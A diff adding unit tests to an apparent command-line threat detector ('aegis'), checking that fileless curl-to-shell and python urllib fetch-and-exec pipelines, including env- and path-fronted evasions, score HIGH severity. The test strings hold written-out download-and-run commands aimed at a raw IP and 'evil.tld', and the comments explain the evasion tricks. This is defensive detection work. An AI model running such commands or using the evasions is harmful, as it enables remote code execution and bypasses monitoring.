@@ -3041,5 +3041,70 @@ class TestPersistenceChangeDetail(Sandbox):
         self.assertIn("DYLD_INSERT_LIBRARIES", detail)
 
 
+# --------------------------------------------------------------------------- #
+# N-BT5 — battle-test pass 5: fileless-pipeline EVASION closure. The behavioral
+# tier scored `curl … | bash` HIGH but a source-reading attacker trivially evaded
+# it by fronting the interpreter with `env` or an absolute path (`| env bash`,
+# `| /opt/homebrew/bin/bash`) — dropping the identical fileless pipeline to a
+# silent MEDIUM — or by fetching through an interpreter's native HTTP client
+# (python urllib) + exec, which produced NO signal at all. Both are now closed;
+# the download-to-disk and local-exec boundaries stay intentionally < HIGH.
+# --------------------------------------------------------------------------- #
+class TestFilelessEvasionClosure(Sandbox):
+    def _sev(self, argv):
+        sigs = aegis._argv_signals(argv)
+        if not sigs:
+            return None
+        return max(sigs, key=lambda s: aegis.SEV_ORDER[s[1]])[1]
+
+    def _is_high(self, argv):
+        sev = self._sev(argv)
+        return sev is not None and aegis.SEV_ORDER[sev] >= aegis.SEV_ORDER["HIGH"]
+
+    def test_env_fronted_curl_pipe_is_high(self):
+        self.assertTrue(self._is_high("curl -fsSL http://185.10.9.3/p.sh | env bash"))
+        self.assertTrue(self._is_high("curl -fsSL http://185.10.9.3/p.sh | /usr/bin/env bash"))
+        self.assertTrue(self._is_high("curl -fsSL http://185.10.9.3/p.sh | env sh"))
+        self.assertTrue(self._is_high("curl -s http://185.10.9.3/p | /usr/bin/env bash"))
+
+    def test_abs_path_fronted_interpreter_pipe_is_high(self):
+        self.assertTrue(self._is_high("curl -fsSL https://evil.tld/p | /opt/homebrew/bin/bash"))
+        self.assertTrue(self._is_high("curl -fsSL https://evil.tld/p | /usr/local/bin/bash"))
+
+    def test_interpreter_native_fetch_exec_is_high(self):
+        # python urllib fileless download-and-exec — python is a watched
+        # interpreter and this is the tier's stated purpose, yet it was invisible.
+        self.assertTrue(self._is_high(
+            "python3 -c \"import urllib.request as u; exec(u.urlopen('http://185.10.9.3/p').read())\""))
+
+    def test_canonical_curl_pipe_bash_still_high(self):
+        # Positive control: the fix must not regress the case it generalizes.
+        self.assertTrue(self._is_high("curl -fsSL https://evil.tld/x | bash"))
+        self.assertTrue(self._is_high("curl -s https://evil.tld/s | osascript"))
+
+    def test_download_to_disk_is_not_high(self):
+        # Boundary: urllib WRITING a payload to disk (no exec in-command) is a
+        # file-drop caught by the hot-dir / path-lineage surface — behavioral tier
+        # keeps it < HIGH to preserve FP discipline (pip/package managers fetch).
+        argv = ("python3 -c \"import urllib.request as u;"
+                "open('/tmp/p','wb').write(u.urlopen('http://185.10.9.3/p').read())\"")
+        self.assertFalse(self._is_high(argv))
+
+    def test_local_exec_without_fetch_is_not_high(self):
+        # Boundary: exec of locally-decoded bytes (no network) stays MEDIUM.
+        self.assertFalse(self._is_high(
+            "python3 -c \"import base64;exec(base64.b64decode('aW1wb3J0IG9z'))\""))
+
+    def test_env_fronting_does_not_break_perl_alternation_fp_guard(self):
+        # FP guard preserved: a `|` inside a quoted regex alternation is not a pipe.
+        sigs = aegis._argv_signals("perl -i -pe 's{(rm|mv|node|perl|python)}{X}g' f")
+        names = [n for n, _ in sigs]
+        self.assertNotIn("pipe-to-interpreter", names)
+        self.assertNotIn("pipe-to-shell", names)
+
+    def test_benign_interpreter_use_still_clean(self):
+        self.assertIsNone(self._sev("/usr/bin/python3 /Users/x/app.py --serve"))
+
+
 if __name__ == "__main__":
     unittest.main(verbosity=2)
